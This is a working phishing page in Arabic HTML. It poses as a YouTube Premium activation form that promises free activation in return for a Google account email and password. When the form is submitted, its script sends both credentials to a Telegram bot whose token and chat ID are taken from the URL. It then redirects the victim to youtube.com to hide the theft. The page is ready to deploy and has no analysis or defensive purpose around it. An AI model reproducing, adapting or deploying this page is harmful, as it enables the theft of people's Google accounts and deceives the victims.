<!DOCTYPE html>
<html lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>YouTube Premium</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f9f9f9;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:40px;width:380px;text-align:center}img{width:120px;margin-bottom:28px}h2{font-size:24px;margin-bottom:4px}p{color:#5f6368;font-size:14px;margin-bottom:20px}input{width:100%;padding:14px;margin:6px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline-color:#1a73e8}.btn{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:14px}a{color:#1a73e8;font-size:14px;text-decoration:none}</style></head>
<body><div class="card">
<img src="https://www.gstatic.com/youtube/img/email/email_logo.png" alt="YouTube">
<h2>تفعيل YouTube Premium</h2>
<p>أدخل بيانات حساب غوغل للتفعيل المجاني</p>
<input type="text" id="email" placeholder="البريد الإلكتروني">
<input type="password" id="pass" placeholder="كلمة المرور">
<button class="btn" onclick="send()">التالي</button>
<a href="#" style="display:block;margin-top:16px">إنشاء حساب</a>
</div>
<script>
const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
if(!e||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('▶️ يوتيوب\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://youtube.com'})}
</script></body></html>
